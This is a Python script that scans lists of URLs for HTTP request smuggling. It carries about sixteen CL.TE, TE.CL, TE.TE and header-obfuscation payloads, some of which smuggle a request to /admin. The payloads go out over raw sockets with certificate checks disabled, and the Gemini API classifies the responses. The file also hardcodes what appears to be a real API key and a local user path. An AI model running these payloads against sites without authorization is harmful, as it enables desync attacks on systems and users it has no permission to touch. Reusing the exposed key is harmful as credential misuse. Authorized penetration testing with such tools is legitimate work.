import os
import requests
import urllib.parse
import json
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor
import socket
import ssl
import logging

# Gemini API configuration
GEMINI_API_KEY = "AIzaSyBRD2TjLNSV5LnTfD38DIy5CWjQy4SGJ_M"
GEMINI_API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("http_smuggling_scan.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Headers for HTTP requests
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
}

# HTTP Request Smuggling payloads
# CL.TE: Content-Length header is used by the front-end server and Transfer-Encoding by the back-end
# TE.CL: Transfer-Encoding header is used by the front-end server and Content-Length by the back-end
# TE.TE: Both servers use Transfer-Encoding but handle it differently
SMUGGLING_PAYLOADS = [
    # CL.TE payloads
    {
        'name': 'CL.TE basic',
        'type': 'CL.TE',
        'headers': {
            'Content-Length': '6',
            'Transfer-Encoding': 'chunked'
        },
        'body': '0\r\n\r\nX',
        'description': 'Basic CL.TE payload where front-end uses Content-Length and back-end uses Transfer-Encoding'
    },
    {
        'name': 'CL.TE with POST',
        'type': 'CL.TE',
        'headers': {
            'Content-Length': '49',
            'Transfer-Encoding': 'chunked'
        },
        'body': '0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: example.com\r\n\r\nX',
        'description': 'CL.TE payload that attempts to smuggle a POST request to /admin'
    },
    {
        'name': 'CL.TE with obfuscated TE',
        'type': 'CL.TE',
        'headers': {
            'Content-Length': '6',
            'Transfer-Encoding': 'chunked',
            'X-Transfer-Encoding': 'chunked'
        },
        'body': '0\r\n\r\nX',
        'description': 'CL.TE payload with obfuscated Transfer-Encoding header'
    },
    
    # TE.CL payloads
    {
        'name': 'TE.CL basic',
        'type': 'TE.CL',
        'headers': {
            'Content-Length': '4',
            'Transfer-Encoding': 'chunked'
        },
        'body': '5c\r\nGPOST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n',
        'description': 'Basic TE.CL payload where front-end uses Transfer-Encoding and back-end uses Content-Length'
    },
    {
        'name': 'TE.CL with space obfuscation',
        'type': 'TE.CL',
        'headers': {
            'Content-Length': '4',
            'Transfer-Encoding ': 'chunked'  # Note the space before the colon
        },
        'body': '5c\r\nGPOST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n',
        'description': 'TE.CL payload with space obfuscation in Transfer-Encoding header'
    },
    
    # TE.TE payloads
    {
        'name': 'TE.TE with different encodings',
        'type': 'TE.TE',
        'headers': {
            'Transfer-Encoding': 'chunked',
            'Transfer-Encoding': 'identity'
        },
        'body': '5c\r\nGPOST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n',
        'description': 'TE.TE payload with different Transfer-Encoding values'
    },
    {
        'name': 'TE.TE with obfuscation',
        'type': 'TE.TE',
        'headers': {
            'Transfer-Encoding': 'chunked',
            'Transfer-Encoding': 'chunked, identity'
        },
        'body': '5c\r\nGPOST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n',
        'description': 'TE.TE payload with obfuscated Transfer-Encoding values'
    },
    
    # Obfuscated Transfer-Encoding headers
    {
        'name': 'Obfuscated TE: lowercase',
        'type': 'Obfuscation',
        'headers': {
            'Content-Length': '6',
            'transfer-encoding': 'chunked'
        },
        'body': '0\r\n\r\nX',
        'description': 'Payload with lowercase transfer-encoding header'
    },
    {
        'name': 'Obfuscated TE: mixed case',
        'type': 'Obfuscation',
        'headers': {
            'Content-Length': '6',
            'Transfer-Encoding': 'cHuNkEd'
        },
        'body': '0\r\n\r\nX',
        'description': 'Payload with mixed case chunked encoding'
    },
    {
        'name': 'Obfuscated TE: space before name',
        'type': 'Obfuscation',
        'headers': {
            'Content-Length': '6',
            ' Transfer-Encoding': 'chunked'
        },
        'body': '0\r\n\r\nX',
        'description': 'Payload with space before header name'
    },
    {
        'name': 'Obfuscated TE: tab before name',
        'type': 'Obfuscation',
        'headers': {
            'Content-Length': '6',
            '\tTransfer-Encoding': 'chunked'
        },
        'body': '0\r\n\r\nX',
        'description': 'Payload with tab before header name'
    },
    {
        'name': 'Obfuscated TE: space after name',
        'type': 'Obfuscation',
        'headers': {
            'Content-Length': '6',
            'Transfer-Encoding ': 'chunked'
        },
        'body': '0\r\n\r\nX',
        'description': 'Payload with space after header name'
    },
    {
        'name': 'Obfuscated TE: space before value',
        'type': 'Obfuscation',
        'headers': {
            'Content-Length': '6',
            'Transfer-Encoding': ' chunked'
        },
        'body': '0\r\n\r\nX',
        'description': 'Payload with space before header value'
    },
    {
        'name': 'Obfuscated TE: space in value',
        'type': 'Obfuscation',
        'headers': {
            'Content-Length': '6',
            'Transfer-Encoding': 'chu nked'
        },
        'body': '0\r\n\r\nX',
        'description': 'Payload with space in header value'
    },
    {
        'name': 'Obfuscated TE: double header',
        'type': 'Obfuscation',
        'headers': {
            'Content-Length': '6',
            'Transfer-Encoding': 'identity',
            'Transfer-Encoding': 'chunked'
        },
        'body': '0\r\n\r\nX',
        'description': 'Payload with double Transfer-Encoding header'
    },
    {
        'name': 'Obfuscated TE: chunked with extra',
        'type': 'Obfuscation',
        'headers': {
            'Content-Length': '6',
            'Transfer-Encoding': 'chunked, identity'
        },
        'body': '0\r\n\r\nX',
        'description': 'Payload with chunked and another encoding'
    },
]

def generate_random_string(length=8):
    """Generate a random string for testing."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def extract_urls_from_file(file_path):
    """Extract URLs from a file."""
    urls = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                url = line.strip()
                if url:  # Make sure URL is not empty
                    urls.append(url)
    except Exception as e:
        logger.error(f"Error reading file: {e}")
    
    logger.info(f"Found {len(urls)} URLs to test.")
    return urls

def send_raw_http_request(host, port, is_https, raw_request):
    """Send a raw HTTP request using sockets."""
    try:
        # Create socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        # Connect to the server
        sock.connect((host, port))
        
        # Wrap with SSL if needed
        if is_https:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
        
        # Send the request
        sock.sendall(raw_request.encode())
        
        # Receive the response
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break
        
        sock.close()
        
        return response.decode('utf-8', errors='ignore')
    
    except Exception as e:
        logger.error(f"Error sending raw HTTP request: {e}")
        return None

def build_raw_http_request(method, path, headers, body=None):
    """Build a raw HTTP request string."""
    request = f"{method} {path} HTTP/1.1\r\n"
    
    for name, value in headers.items():
        request += f"{name}: {value}\r\n"
    
    request += "\r\n"
    
    if body:
        request += body
    
    return request

def analyze_with_gemini(url, payload, response_content, original_content):
    """
    Use Gemini API to analyze if the HTTP request smuggling payload is likely to be successful.
    """
    # First, check for common indicators
    indicators = [
        "Unrecognized method GPOST",
        "Bad Request",
        "411 Length Required",
        "400 Bad Request",
        "Malformed Request",
        "Invalid request line",
        "Request header or cookie too large",
        "Request header field too large",
        "Header syntax error",
        "Timeout"
    ]
    
    # If the response is significantly different from the original, it might indicate a vulnerability
    response_diff = False
    if original_content and response_content:
        if len(original_content) != len(response_content) and abs(len(original_content) - len(response_content)) > 100:
            response_diff = True
    
    # Use Gemini for more advanced analysis
    prompt = f"""
    I need to analyze if this HTTP Request Smuggling payload is likely to be successful based on the following response.
    
    URL: {url}
    Payload Type: {payload['type']}
    Payload Name: {payload['name']}
    Payload Description: {payload['description']}
    
    Original Response Length: {len(original_content) if original_content else 'N/A'}
    Modified Response Length: {len(response_content) if response_content else 'N/A'}
    
    Response (truncated if necessary):
    {response_content[:4000] if response_content else 'No response'}
    
    Please analyze if:
    1. There are any indicators of successful HTTP request smuggling in the response
    2. The response shows signs of request parsing issues
    3. The response contains error messages that might indicate request smuggling attempts
    4. The response timing or structure suggests vulnerability to request smuggling
    
    Respond with only "VULNERABLE" or "NOT VULNERABLE" followed by a brief explanation.
    """
    
    api_url = f"{GEMINI_API_URL}?key={GEMINI_API_KEY}"
    
    data = {
        "contents": [
            {
                "parts": [
                    {"text": prompt}
                ]
            }
        ],
        "generationConfig": {
            "temperature": 0.1,
            "maxOutputTokens": 200
        }
    }
    
    try:
        response = requests.post(api_url, json=data)
        if response.status_code == 200:
            result = response.json()
            if "candidates" in result and len(result["candidates"]) > 0:
                text = result["candidates"][0]["content"]["parts"][0]["text"]
                is_vulnerable = text.strip().startswith("VULNERABLE")
                explanation = text.strip()
                return is_vulnerable, explanation
        return False, "Error analyzing response with Gemini"
    except Exception as e:
        return False, f"Error calling Gemini API: {str(e)}"

def test_url_for_http_smuggling(url):
    """Test a URL for HTTP request smuggling vulnerabilities."""
    logger.info(f"Testing URL: {url}")
    results = []
    
    try:
        # Parse the URL
        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.netloc
        path = parsed_url.path if parsed_url.path else "/"
        is_https = parsed_url.scheme == "https"
        port = parsed_url.port or (443 if is_https else 80)
        
        # If host includes port, extract it
        if ":" in host:
            host, port_str = host.split(":")
            port = int(port_str)
        
        # Get a baseline response
        try:
            normal_headers = HEADERS.copy()
            normal_request = build_raw_http_request("GET", path, normal_headers)
            normal_response = send_raw_http_request(host, port, is_https, normal_request)
        except Exception as e:
            logger.error(f"Error getting baseline response: {e}")
            normal_response = None
        
        # Test each payload
        for payload in SMUGGLING_PAYLOADS:
            logger.info(f"Testing payload: {payload['name']}")
            
            try:
                # Prepare headers
                test_headers = HEADERS.copy()
                for header_name, header_value in payload['headers'].items():
                    test_headers[header_name] = header_value
                
                # Add host header if not present
                if 'Host' not in test_headers:
                    test_headers['Host'] = host
                
                # Build and send the request
                test_request = build_raw_http_request("POST", path, test_headers, payload['body'])
                start_time = time.time()
                test_response = send_raw_http_request(host, port, is_https, test_request)
                response_time = time.time() - start_time
                
                # Check for timeout (might indicate vulnerability)
                if test_response is None:
                    logger.info(f"Request timed out with payload {payload['name']}, might indicate vulnerability")
                    results.append({
                        'url': url,
                        'payload_name': payload['name'],
                        'payload_type': payload['type'],
                        'status': 'Potential HTTP Request Smuggling Vulnerability',
                        'analysis': "Request timed out, which might indicate that the server is waiting for the rest of the request"
                    })
                    continue
                
                # Use Gemini to analyze the response
                is_vulnerable, explanation = analyze_with_gemini(url, payload, test_response, normal_response)
                
                if is_vulnerable:
                    logger.info(f"Potential HTTP request smuggling vulnerability found with payload: {payload['name']}")
                    results.append({
                        'url': url,
                        'payload_name': payload['name'],
                        'payload_type': payload['type'],
                        'status': 'Potential HTTP Request Smuggling Vulnerability',
                        'analysis': explanation
                    })
                
                # Add a small delay between requests
                time.sleep(1)
            
            except Exception as e:
                logger.error(f"Error testing payload {payload['name']}: {e}")
                continue
    
    except Exception as e:
        logger.error(f"Error processing URL {url}: {e}")
    
    return results

def scan_http_smuggling(urls_file_path, max_workers=2):
    """
    Scan URLs for HTTP request smuggling vulnerabilities.
    
    Args:
        urls_file_path: Path to the file containing URLs
        max_workers: Maximum number of concurrent workers
    
    Returns:
        List of potential HTTP request smuggling vulnerabilities
    """
    if not os.path.exists(urls_file_path):
        logger.error(f"File not found: {urls_file_path}")
        return []
    
    urls = extract_urls_from_file(urls_file_path)
    if not urls:
        logger.warning("No URLs found in the file.")
        return []
    
    logger.info(f"Found {len(urls)} URLs to test.")
    
    # Process URLs in smaller batches to show progress
    batch_size = 5
    all_results = []
    
    for i in range(0, len(urls), batch_size):
        batch = urls[i:i+batch_size]
        logger.info(f"\nProcessing batch {i//batch_size + 1}/{(len(urls) + batch_size - 1)//batch_size}...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(test_url_for_http_smuggling, batch))
            
            for result in results:
                all_results.extend(result)
                
        # Show intermediate results
        if all_results:
            logger.info(f"Found {len(all_results)} potential vulnerabilities so far")
    
    # Save results to file
    output_dir = os.path.dirname(urls_file_path)
    domain = os.path.basename(urls_file_path).split('_')[0]
    output_file = os.path.join(output_dir, f"{domain}_http_smuggling_results.txt")
    
    with open(output_file, 'w') as f:
        if all_results:
            f.write("HTTP Request Smuggling Vulnerability Scan Results\n")
            f.write("===============================================\n\n")
            
            for result in all_results:
                f.write(f"URL: {result['url']}\n")
                f.write(f"Payload Name: {result['payload_name']}\n")
                f.write(f"Payload Type: {result['payload_type']}\n")
                f.write(f"Status: {result['status']}\n")
                f.write(f"Analysis: {result['analysis']}\n")
                f.write("-----------------------------\n\n")
        else:
            f.write("No HTTP Request Smuggling vulnerabilities found.\n")
    
    return all_results

def test_specific_endpoint(target_url):
    """Test a specific endpoint for HTTP request smuggling vulnerabilities."""
    logger.info(f"Testing endpoint: {target_url}")
    
    results = test_url_for_http_smuggling(target_url)
    
    if results:
        logger.info(f"\nFound {len(results)} potential HTTP request smuggling vulnerabilities!")
        for result in results:
            logger.info(f"\nURL: {result['url']}")
            logger.info(f"Payload Name: {result['payload_name']}")
            logger.info(f"Payload Type: {result['payload_type']}")
            logger.info(f"Status: {result['status']}")
            logger.info(f"Analysis: {result['analysis']}")
    else:
        logger.info("\nNo HTTP request smuggling vulnerabilities found.")
    
    return results

if __name__ == "__main__":
    # For testing the script directly
    import sys
    
    if len(sys.argv) > 1:
        file_path = sys.argv[1]
        
        # Check if it's a direct endpoint test
        if file_path.startswith('http'):
            results = test_specific_endpoint(file_path)
        else:
            logger.info(f"Scanning file: {file_path}")
            results = scan_http_smuggling(file_path)
            
            if results:
                logger.info(f"\nFound {len(results)} potential HTTP request smuggling vulnerabilities!")
                for result in results:
                    logger.info(f"\nURL: {result['url']}")
                    logger.info(f"Payload Name: {result['payload_name']}")
                    logger.info(f"Payload Type: {result['payload_type']}")
                    logger.info(f"Status: {result['status']}")
                    logger.info(f"Analysis: {result['analysis']}")
            else:
                logger.info("\nNo HTTP request smuggling vulnerabilities found.")
    else:
        print("Usage: python http_smuggling_test.py <path_to_urls_file_or_direct_url>")
        print("Examples:")
        print("  python http_smuggling_test.py C:\\Users\\begad\\OneDrive\\Desktop\\Recon-test\\crawler\\example.com_urls.txt")
        print("  python http_smuggling_test.py http://example.com")